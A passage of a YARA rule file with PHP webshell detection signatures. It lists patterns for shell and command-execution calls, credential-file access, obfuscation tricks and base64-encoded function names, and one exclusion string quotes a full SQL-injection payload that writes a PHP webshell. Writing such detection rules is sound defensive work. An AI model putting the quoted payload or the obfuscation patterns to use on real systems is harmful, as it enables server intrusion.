        $gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
        $gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
        $gen_bit_sus30 = "serv-u" wide ascii
        $gen_bit_sus31 = "Serv-u" wide ascii
        $gen_bit_sus32 = "Army" fullword wide ascii
        // single letter paramweter
        $gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
        $gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
        $gen_bit_sus35 = "crack" fullword wide ascii

        $gen_bit_sus44 = "<pre>" wide ascii
        $gen_bit_sus45 = "<PRE>" wide ascii
        $gen_bit_sus46 = "shell_" wide ascii
        //fp: $gen_bit_sus47 = "Shell" fullword wide ascii
        $gen_bit_sus50 = "bypass" wide ascii
        $gen_bit_sus52 = " ^ $" wide ascii
        $gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
        $gen_bit_sus55 = /\w'\.'\w/ wide ascii
        $gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
        $gen_bit_sus57 = "dumper" wide ascii
        $gen_bit_sus59 = "'cmd'" wide ascii
        $gen_bit_sus60 = "\"execute\"" wide ascii
        $gen_bit_sus61 = "/bin/sh" wide ascii
        $gen_bit_sus62 = "Cyber" wide ascii
        $gen_bit_sus63 = "portscan" fullword wide ascii
        //$gen_bit_sus64 = "\"command\"" fullword wide ascii
        //$gen_bit_sus65 = "'command'" fullword wide ascii
        $gen_bit_sus66 = "whoami" fullword wide ascii
        $gen_bit_sus67 = "$password='" fullword wide ascii
        $gen_bit_sus68 = "$password=\"" fullword wide ascii
        $gen_bit_sus69 = "$cmd" fullword wide ascii
        $gen_bit_sus70 = "\"?>\"." fullword wide ascii
        $gen_bit_sus71 = "Hacking" fullword wide ascii
        $gen_bit_sus72 = "hacking" fullword wide ascii
        $gen_bit_sus73 = ".htpasswd" wide ascii
        $gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
        $gen_bit_sus75 = "uploaded" fullword wide ascii

        // very suspicious strings, one is enough
        $gen_much_sus7  = "Web Shell" nocase
        $gen_much_sus8  = "WebShell" nocase
        $gen_much_sus3  = "hidded shell"
        $gen_much_sus4  = "WScript.Shell.1" nocase
        $gen_much_sus5  = "AspExec"
        $gen_much_sus14 = "\\pcAnywhere\\" nocase
        $gen_much_sus15 = "antivirus" nocase
        $gen_much_sus16 = "McAfee" nocase
        $gen_much_sus17 = "nishang"
        $gen_much_sus18 = "\"unsafe" fullword wide ascii
        $gen_much_sus19 = "'unsafe" fullword wide ascii
        $gen_much_sus24 = "exploit" fullword wide ascii
        $gen_much_sus25 = "Exploit" fullword wide ascii
        $gen_much_sus26 = "TVqQAAMAAA" wide ascii
        $gen_much_sus30 = "Hacker" wide ascii
        $gen_much_sus31 = "HACKED" fullword wide ascii
        $gen_much_sus32 = "hacked" fullword wide ascii
        $gen_much_sus33 = "hacker" wide ascii
        $gen_much_sus34 = "grayhat" nocase wide ascii
        $gen_much_sus35 = "Microsoft FrontPage" wide ascii
        $gen_much_sus36 = "Rootkit" wide ascii
        $gen_much_sus37 = "rootkit" wide ascii
        $gen_much_sus38 = "/*-/*-*/" wide ascii
        $gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
        $gen_much_sus40 = "\"e\"+\"v" wide ascii
        $gen_much_sus41 = "a\"+\"l\"" wide ascii
        $gen_much_sus42 = "\"+\"(\"+\"" wide ascii
        $gen_much_sus43 = "q\"+\"u\"" wide ascii
        $gen_much_sus44 = "\"u\"+\"e" wide ascii
        $gen_much_sus45 = "/*//*/" wide ascii
        $gen_much_sus46 = "(\"/*/\"" wide ascii
        $gen_much_sus47 = "eval(eval(" wide ascii
        // self remove
        $gen_much_sus48 = "unlink(__FILE__)" wide ascii
        $gen_much_sus49 = "Shell.Users" wide ascii
        $gen_much_sus50 = "PasswordType=Regular" wide ascii
        $gen_much_sus51 = "-Expire=0" wide ascii
        $gen_much_sus60 = "_=$$_" wide ascii
        $gen_much_sus61 = "_=$$_" wide ascii
        $gen_much_sus62 = "++;$" wide ascii
        $gen_much_sus63 = "++; $" wide ascii
        $gen_much_sus64 = "_.=$_" wide ascii
        $gen_much_sus70 = "-perm -04000" wide ascii
        $gen_much_sus71 = "-perm -02000" wide ascii
        $gen_much_sus72 = "grep -li password" wide ascii
        $gen_much_sus73 = "-name config.inc.php" wide ascii
        // touch without parameters sets the time to now, not malicious and gives fp
        $gen_much_sus75 = "password crack" wide ascii
        $gen_much_sus76 = "mysqlDll.dll" wide ascii
        $gen_much_sus77 = "net user" wide ascii
        $gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
        $gen_much_sus81 = /strrev\(['"]/ wide ascii
        $gen_much_sus82 = "PHPShell" fullword wide ascii
        $gen_much_sus821= "PHP Shell" fullword wide ascii
        $gen_much_sus83 = "phpshell" fullword wide ascii
        $gen_much_sus84 = "PHPshell" fullword wide ascii
        $gen_much_sus87 = "deface" wide ascii
        $gen_much_sus88 = "Deface" wide ascii
        $gen_much_sus89 = "backdoor" wide ascii
        $gen_much_sus90 = "r00t" fullword wide ascii
        $gen_much_sus91 = "xp_cmdshell" fullword wide ascii
        $gen_much_sus92 = "str_rot13" fullword wide ascii

        $gif = { 47 49 46 38 }


        //strings from private rule capa_php_payload_multiple
        // \([^)] to avoid matching on e.g. eval() in comments
        $cmpayload1 = /\beval[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload2 = /\bexec[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload3 = /\bshell_exec[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload4 = /\bpassthru[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload5 = /\bsystem[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload6 = /\bpopen[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload7 = /\bproc_open[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload8 = /\bpcntl_exec[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload9 = /\bassert[\t ]{0,500}\([^)0]/ nocase wide ascii
        $cmpayload10 = /\bpreg_replace[\t ]{0,500}\([^\)]{1,100}\/e/ nocase wide ascii
        $cmpayload11 = /\bpreg_filter[\t ]{0,500}\([^\)]{1,100}\/e/ nocase wide ascii
        $cmpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cmpayload20 = /\bcreate_function[\t ]{0,500}\([^)]/ nocase wide ascii
        $cmpayload21 = /\bReflectionFunction[\t ]{0,500}\([^)]/ nocase wide ascii

        $fp1 = "# Some examples from obfuscated malware:" ascii
        $fp2 = "{@see TFileUpload} for further details." ascii
    condition:
        //any of them or
        not (
            any of ( $gfp_tiny* )
            or 1 of ($fp*)
        )
        and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and (
            any of ( $inp* )
        )
        and (
            any of ( $cpayload* ) or
        all of ( $m_cpayload_preg_filter* )
        )
        and
        ( ( filesize < 1000 and not any of ( $wfp_tiny* ) ) or
        ( (
        $gif at 0 or
        (
            filesize < 4KB and
            (
                1 of ( $gen_much_sus* ) or
                2 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 20KB and
            (
                2 of ( $gen_much_sus* ) or
                3 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 50KB and
            (
                2 of ( $gen_much_sus* ) or
                4 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 100KB and
            (
                2 of ( $gen_much_sus* ) or
                6 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 150KB and
            (
                3 of ( $gen_much_sus* ) or
                7 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 500KB and
            (
                4 of ( $gen_much_sus* ) or
                8 of ( $gen_bit_sus* )
            )
        )
        )
        and
        ( filesize > 5KB or not any of ( $wfp_tiny* ) ) ) or
        ( filesize < 500KB and (
            4 of ( $cmpayload* )
        )
        ) )
}

rule WEBSHELL_PHP_Generic_Callback
{
    meta:
        description = "php webshell having some kind of input and using a callback to execute the payload. restricted to small files or would give lots of false positives"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/01/14"
        modified = "2023-09-18"
        score = 60
        hash = "e98889690101b59260e871c49263314526f2093f"
        hash = "63297f8c1d4e88415bc094bc5546124c9ed8d57aca3a09e36ae18f5f054ad172"
        hash = "81388c8cc99353cdb42572bb88df7d3bd70eefc748c2fa4224b6074aa8d7e6a2"
        hash = "27d3bfabc283d851b0785199da8b1b0384afcb996fa9217687274dd56a7b5f49"
        hash = "ee256d7cc3ceb2bf3a1934d553cdd36e3fbde62a02b20a1b748a74e85d4dbd33"
        hash = "4adc6c5373c4db7b8ed1e7e6df10a3b2ce5e128818bb4162d502056677c6f54a"
        hash = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
        hash = "2967f38c26b131f00276bcc21227e54ee6a71881da1d27ec5157d83c4c9d4f51"
        hash = "1ba02fb573a06d5274e30b2b05573305294497769414e964a097acb5c352fb92"
        hash = "f4fe8e3b2c39090ca971a8e61194fdb83d76fadbbace4c5eb15e333df61ce2a4"
        hash = "badda1053e169fea055f5edceae962e500842ad15a5d31968a0a89cf28d89e91"
        hash = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
        hash = "51c2c8b94c4b8cce806735bcf6e5aa3f168f0f7addce47b699b9a4e31dc71b47"
        hash = "de1ef827bcd3100a259f29730cb06f7878220a7c02cee0ebfc9090753d2237a8"
        hash = "487e8c08e85774dfd1f5e744050c08eb7d01c6877f7d03d7963187748339e8c4"

        id = "e33dba84-bbeb-5955-a81b-2d2c8637fb48"
    strings:

        //strings from private rule php_false_positive
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        // a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
        $gfp1  = "eval(\"return [$serialised_parameter" // elgg
        $gfp2  = "$this->assert(strpos($styles, $"
        $gfp3  = "$module = new $_GET['module']($_GET['scope']);"
        $gfp4  = "$plugin->$_POST['action']($_POST['id']);"
        $gfp5  = "$_POST[partition_by]($_POST["
        $gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
        $gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
        $gfp8  = "Smarty_Internal_Debug::start_render($_template);"
        $gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
        $gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
        $gfp11 = "(eval (getenv \"EPROLOG\")))"
        $gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"

        //strings from private rule php_false_positive_tiny
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        //$gfp_tiny1 = "addslashes" fullword
        //$gfp_tiny2 = "escapeshellarg" fullword
        $gfp_tiny3 = "include \"./common.php\";" // xcache
        $gfp_tiny4 = "assert('FALSE');"
        $gfp_tiny5 = "assert(false);"
        $gfp_tiny6 = "assert(FALSE);"
        $gfp_tiny7 = "assert('array_key_exists("
        $gfp_tiny8 = "echo shell_exec($aspellcommand . ' 2>&1');"
        $gfp_tiny9 = "throw new Exception('Could not find authentication source with id ' . $sourceId);"
        $gfp_tiny10= "return isset( $_POST[ $key ] ) ? $_POST[ $key ] : ( isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $default );"

        //strings from private rule capa_php_input
        $inp1 = "php://input" wide ascii
        $inp2 = /_GET\s?\[/ wide ascii
        // for passing $_GET to a function
        $inp3 = /\(\s?\$_GET\s?\)/ wide ascii
        $inp4 = /_POST\s?\[/ wide ascii
        $inp5 = /\(\s?\$_POST\s?\)/ wide ascii
        $inp6 = /_REQUEST\s?\[/ wide ascii
        $inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
        // PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
        $inp15 = "_SERVER['HTTP_" wide ascii
        $inp16 = "_SERVER[\"HTTP_" wide ascii
        $inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
        $inp18 = "array_values($_SERVER)" wide ascii
        $inp19 = /file_get_contents\("https?:\/\// wide ascii

        // TODO: arraywalk \n /*
        //strings from private rule capa_php_callback
        // the end is 1. ( followed by anything but a direct closing ) 2. /* for the start of an obfuscation comment
        $callback1 = /\bob_start[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback2 = /\barray_diff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback3 = /\barray_diff_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback4 = /\barray_filter[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback5 = /\barray_intersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback6 = /\barray_intersect_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback7 = /\barray_map[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback8 = /\barray_reduce[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback9 = /\barray_udiff_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback10 = /\barray_udiff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback11 = /\barray_udiff[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback12 = /\barray_uintersect_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback13 = /\barray_uintersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback14 = /\barray_uintersect[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback15 = /\barray_walk_recursive[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback16 = /\barray_walk[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback17 = /\bassert_options[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback18 = /\buasort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback19 = /\buksort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback20 = /\busort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback21 = /\bpreg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback22 = /\bspl_autoload_register[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback23 = /\biterator_apply[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback24 = /\bcall_user_func[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback25 = /\bcall_user_func_array[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback26 = /\bregister_shutdown_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback27 = /\bregister_tick_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback28 = /\bset_error_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback29 = /\bset_exception_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback30 = /\bsession_set_save_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback31 = /\bsqlite_create_aggregate[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback32 = /\bsqlite_create_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback33 = /\bmb_ereg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii

        $m_callback1 = /\bfilter_var[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $m_callback2 = "FILTER_CALLBACK" fullword wide ascii

        $cfp1 = /ob_start\(['\"]ob_gzhandler/ nocase wide ascii
        $cfp2 = "IWPML_Backend_Action_Loader" ascii wide
        $cfp3 = "<?phpclass WPML" ascii

        //strings from private rule capa_gen_sus

        // these strings are just a bit suspicious, so several of them are needed, depending on filesize
        $gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
        $gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
        $gen_bit_sus6  = "self.delete"
        $gen_bit_sus9  = "\"cmd /c" nocase
        $gen_bit_sus10 = "\"cmd\"" nocase
        $gen_bit_sus11 = "\"cmd.exe" nocase
        $gen_bit_sus12 = "%comspec%" wide ascii
        $gen_bit_sus13 = "%COMSPEC%" wide ascii
        //TODO:$gen_bit_sus12 = ".UserName" nocase
        $gen_bit_sus18 = "Hklm.GetValueNames();" nocase
        // bonus string for proxylogon exploiting webshells
        $gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
        $gen_bit_sus21 = "\"upload\"" wide ascii
        $gen_bit_sus22 = "\"Upload\"" wide ascii
        $gen_bit_sus23 = "UPLOAD" fullword wide ascii
        $gen_bit_sus24 = "fileupload" wide ascii
        $gen_bit_sus25 = "file_upload" wide ascii
        // own base64 or base32 func
        $gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
        $gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
        $gen_bit_sus30 = "serv-u" wide ascii
        $gen_bit_sus31 = "Serv-u" wide ascii
        $gen_bit_sus32 = "Army" fullword wide ascii
        // single letter paramweter
        $gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
        $gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
        $gen_bit_sus35 = "crack" fullword wide ascii

        $gen_bit_sus44 = "<pre>" wide ascii
        $gen_bit_sus45 = "<PRE>" wide ascii
        $gen_bit_sus46 = "shell_" wide ascii
        //fp: $gen_bit_sus47 = "Shell" fullword wide ascii
        $gen_bit_sus50 = "bypass" wide ascii
        $gen_bit_sus52 = " ^ $" wide ascii
        $gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
        $gen_bit_sus55 = /\w'\.'\w/ wide ascii
        $gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
        $gen_bit_sus57 = "dumper" wide ascii
        $gen_bit_sus59 = "'cmd'" wide ascii
        $gen_bit_sus60 = "\"execute\"" wide ascii
        $gen_bit_sus61 = "/bin/sh" wide ascii
        $gen_bit_sus62 = "Cyber" wide ascii
        $gen_bit_sus63 = "portscan" fullword wide ascii
        //$gen_bit_sus64 = "\"command\"" fullword wide ascii
        //$gen_bit_sus65 = "'command'" fullword wide ascii
        $gen_bit_sus66 = "whoami" fullword wide ascii
        $gen_bit_sus67 = "$password='" fullword wide ascii
        $gen_bit_sus68 = "$password=\"" fullword wide ascii
        $gen_bit_sus69 = "$cmd" fullword wide ascii
        $gen_bit_sus70 = "\"?>\"." fullword wide ascii
        $gen_bit_sus71 = "Hacking" fullword wide ascii
        $gen_bit_sus72 = "hacking" fullword wide ascii
        $gen_bit_sus73 = ".htpasswd" wide ascii
        $gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii

        // very suspicious strings, one is enough
        $gen_much_sus7  = "Web Shell" nocase
        $gen_much_sus8  = "WebShell" nocase
        $gen_much_sus3  = "hidded shell"
        $gen_much_sus4  = "WScript.Shell.1" nocase
        $gen_much_sus5  = "AspExec"
        $gen_much_sus14 = "\\pcAnywhere\\" nocase
        $gen_much_sus15 = "antivirus" nocase
        $gen_much_sus16 = "McAfee" nocase
        $gen_much_sus17 = "nishang"
        $gen_much_sus18 = "\"unsafe" fullword wide ascii
        $gen_much_sus19 = "'unsafe" fullword wide ascii
        $gen_much_sus24 = "exploit" fullword wide ascii
        $gen_much_sus25 = "Exploit" fullword wide ascii
        $gen_much_sus26 = "TVqQAAMAAA" wide ascii
        $gen_much_sus30 = "Hacker" wide ascii
        $gen_much_sus31 = "HACKED" fullword wide ascii
        $gen_much_sus32 = "hacked" fullword wide ascii
        $gen_much_sus33 = "hacker" wide ascii
        $gen_much_sus34 = "grayhat" nocase wide ascii
        $gen_much_sus35 = "Microsoft FrontPage" wide ascii
        $gen_much_sus36 = "Rootkit" wide ascii
        $gen_much_sus37 = "rootkit" wide ascii
        $gen_much_sus38 = "/*-/*-*/" wide ascii
        $gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
        $gen_much_sus40 = "\"e\"+\"v" wide ascii
        $gen_much_sus41 = "a\"+\"l\"" wide ascii
        $gen_much_sus42 = "\"+\"(\"+\"" wide ascii
        $gen_much_sus43 = "q\"+\"u\"" wide ascii
        $gen_much_sus44 = "\"u\"+\"e" wide ascii
        $gen_much_sus45 = "/*//*/" wide ascii
        $gen_much_sus46 = "(\"/*/\"" wide ascii
        $gen_much_sus47 = "eval(eval(" wide ascii
        // self remove
        $gen_much_sus48 = "unlink(__FILE__)" wide ascii
        $gen_much_sus49 = "Shell.Users" wide ascii
        $gen_much_sus50 = "PasswordType=Regular" wide ascii
        $gen_much_sus51 = "-Expire=0" wide ascii
        $gen_much_sus60 = "_=$$_" wide ascii
        $gen_much_sus61 = "_=$$_" wide ascii
        $gen_much_sus62 = "++;$" wide ascii
        $gen_much_sus63 = "++; $" wide ascii
        $gen_much_sus64 = "_.=$_" wide ascii
        $gen_much_sus70 = "-perm -04000" wide ascii
        $gen_much_sus71 = "-perm -02000" wide ascii
        $gen_much_sus72 = "grep -li password" wide ascii
        $gen_much_sus73 = "-name config.inc.php" wide ascii
        // touch without parameters sets the time to now, not malicious and gives fp
        $gen_much_sus75 = "password crack" wide ascii
        $gen_much_sus76 = "mysqlDll.dll" wide ascii
        $gen_much_sus77 = "net user" wide ascii
        $gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
        $gen_much_sus81 = /strrev\(['"]/ wide ascii
        $gen_much_sus82 = "PHPShell" fullword wide ascii
        $gen_much_sus821= "PHP Shell" fullword wide ascii
        $gen_much_sus83 = "phpshell" fullword wide ascii
        $gen_much_sus84 = "PHPshell" fullword wide ascii
        $gen_much_sus87 = "deface" wide ascii
        $gen_much_sus88 = "Deface" wide ascii
        $gen_much_sus89 = "backdoor" wide ascii
        $gen_much_sus90 = "r00t" fullword wide ascii
        $gen_much_sus91 = "xp_cmdshell" fullword wide ascii
        $gen_much_sus92 = "base64_decode(base64_decode(" fullword wide ascii
        $gen_much_sus93 = "eval(\"/*" wide ascii
        $gen_much_sus94 = "http_response_code(404)" wide ascii

        $gif = { 47 49 46 38 }


    condition:
        //any of them or
        not (
            any of ( $gfp* )
        )
        and not (
            any of ( $gfp_tiny* )
        )
        and (
            any of ( $inp* )
        )
        and (
            not any of ( $cfp* ) and
                (
                    any of ( $callback* )  or
                    all of ( $m_callback* )
                )
            )
            and
            ( filesize < 1000 or (
                $gif at 0 or
                (
                    filesize < 4KB and
                    (
                        1 of ( $gen_much_sus* ) or
                        2 of ( $gen_bit_sus* )
                    )
                ) or (
                    filesize < 20KB and
                    (
                        2 of ( $gen_much_sus* ) or
                        3 of ( $gen_bit_sus* )
                    )
                ) or (
                    filesize < 50KB and
                    (
                        2 of ( $gen_much_sus* ) or
                        4 of ( $gen_bit_sus* )
                    )
                ) or (
                    filesize < 100KB and
                    (
                        2 of ( $gen_much_sus* ) or
                        6 of ( $gen_bit_sus* )
                    )
                ) or (
                    filesize < 150KB and
                    (
                        3 of ( $gen_much_sus* ) or
                        7 of ( $gen_bit_sus* )
                    )
                ) or (
                    filesize < 500KB and
                    (
                        4 of ( $gen_much_sus* ) or
                        8 of ( $gen_bit_sus* )
                    )
                )
            )
        )
}

rule WEBSHELL_PHP_Base64_Encoded_Payloads : FILE {
    meta:
        description = "php webshell containing base64 encoded payload"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "88d0d4696c9cb2d37d16e330e236cb37cfaec4cd"
        hash = "e3b4e5ec29628791f836e15500f6fdea19beaf3e8d9981c50714656c50d3b365"
        hash = "e726cd071915534761822805724c6c6bfe0fcac604a86f09437f03f301512dc5"
        hash = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
        hash = "8cc9802769ede56f1139abeaa0735526f781dff3b6c6334795d1d0f19161d076"
        hash = "4cda0c798908b61ae7f4146c6218d7b7de14cbcd7c839edbdeb547b5ae404cd4"
        hash = "afd9c9b0df0b2ca119914ea0008fad94de3bd93c6919f226b793464d4441bdf4"
        hash = "b2048dc30fc7681094a0306a81f4a4cc34f0b35ccce1258c20f4940300397819"
        hash = "da6af9a4a60e3a484764010fbf1a547c2c0a2791e03fc11618b8fc2605dceb04"
        hash = "222cd9b208bd24955bcf4f9976f9c14c1d25e29d361d9dcd603d57f1ea2b0aee"
        hash = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
        hash = "6b6cd1ef7e78e37cbcca94bfb5f49f763ba2f63ed8b33bc4d7f9e5314c87f646"
        hash = "51c2c8b94c4b8cce806735bcf6e5aa3f168f0f7addce47b699b9a4e31dc71b47"
        hash = "7a16311a371f03b29d5220484e7ecbe841cfaead4e73c17aa6a9c23b5d94544d"
        hash = "e2b1dfcfaa61e92526a3a444be6c65330a8db4e692543a421e19711760f6ffe2"

        id = "4e42b47d-725b-5e1f-9408-6c6329f60506"
    strings:
        $decode1 = "base64_decode" fullword nocase wide ascii
        $decode2 = "openssl_decrypt" fullword nocase wide ascii
        // exec
        $one1 = "leGVj"
        $one2 = "V4ZW"
        $one3 = "ZXhlY"
        $one4 = "UAeABlAGMA"
        $one5 = "lAHgAZQBjA"
        $one6 = "ZQB4AGUAYw"
        // shell_exec
        $two1 = "zaGVsbF9leGVj"
        $two2 = "NoZWxsX2V4ZW"
        $two3 = "c2hlbGxfZXhlY"
        $two4 = "MAaABlAGwAbABfAGUAeABlAGMA"
        $two5 = "zAGgAZQBsAGwAXwBlAHgAZQBjA"
        $two6 = "cwBoAGUAbABsAF8AZQB4AGUAYw"
        // passthru
        $three1 = "wYXNzdGhyd"
        $three2 = "Bhc3N0aHJ1"
        $three3 = "cGFzc3Rocn"
        $three4 = "AAYQBzAHMAdABoAHIAdQ"
        $three5 = "wAGEAcwBzAHQAaAByAHUA"
        $three6 = "cABhAHMAcwB0AGgAcgB1A"
        // system
        $four1 = "zeXN0ZW"
        $four2 = "N5c3Rlb"
        $four3 = "c3lzdGVt"
        $four4 = "MAeQBzAHQAZQBtA"
        $four5 = "zAHkAcwB0AGUAbQ"
        $four6 = "cwB5AHMAdABlAG0A"
        // popen
        $five1 = "wb3Blb"
        $five2 = "BvcGVu"
        $five3 = "cG9wZW"
        $five4 = "AAbwBwAGUAbg"
        $five5 = "wAG8AcABlAG4A"
        $five6 = "cABvAHAAZQBuA"
        // proc_open
        $six1 = "wcm9jX29wZW"
        $six2 = "Byb2Nfb3Blb"
        $six3 = "cHJvY19vcGVu"
        $six4 = "AAcgBvAGMAXwBvAHAAZQBuA"
        $six5 = "wAHIAbwBjAF8AbwBwAGUAbg"
        $six6 = "cAByAG8AYwBfAG8AcABlAG4A"
        // pcntl_exec
        $seven1 = "wY250bF9leGVj"
        $seven2 = "BjbnRsX2V4ZW"
        $seven3 = "cGNudGxfZXhlY"
        $seven4 = "AAYwBuAHQAbABfAGUAeABlAGMA"
        $seven5 = "wAGMAbgB0AGwAXwBlAHgAZQBjA"
        $seven6 = "cABjAG4AdABsAF8AZQB4AGUAYw"
        // eval
        $eight1 = "ldmFs"
        $eight2 = "V2YW"
        $eight3 = "ZXZhb"
        $eight4 = "UAdgBhAGwA"
        $eight5 = "lAHYAYQBsA"
        $eight6 = "ZQB2AGEAbA"
        // assert
        $nine1 = "hc3Nlcn"
        $nine2 = "Fzc2Vyd"
        $nine3 = "YXNzZXJ0"
        $nine4 = "EAcwBzAGUAcgB0A"
        $nine5 = "hAHMAcwBlAHIAdA"
        $nine6 = "YQBzAHMAZQByAHQA"

        // false positives

        // execu
        $execu1 = "leGVjd"
        $execu2 = "V4ZWN1"
        $execu3 = "ZXhlY3"

        // esystem like e.g. filesystem
        $esystem1 = "lc3lzdGVt"
        $esystem2 = "VzeXN0ZW"
        $esystem3 = "ZXN5c3Rlb"

        // opening
        $opening1 = "vcGVuaW5n"
        $opening2 = "9wZW5pbm"
        $opening3 = "b3BlbmluZ"

        // false positives
        $fp1 = { D0 CF 11 E0 A1 B1 1A E1 }
        // api.telegram
        $fp2 = "YXBpLnRlbGVncmFtLm9"
        // Log files
        $fp3 = " GET /"
        $fp4 = " POST /"

    $fpa1 = "/cn=Recipients"

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
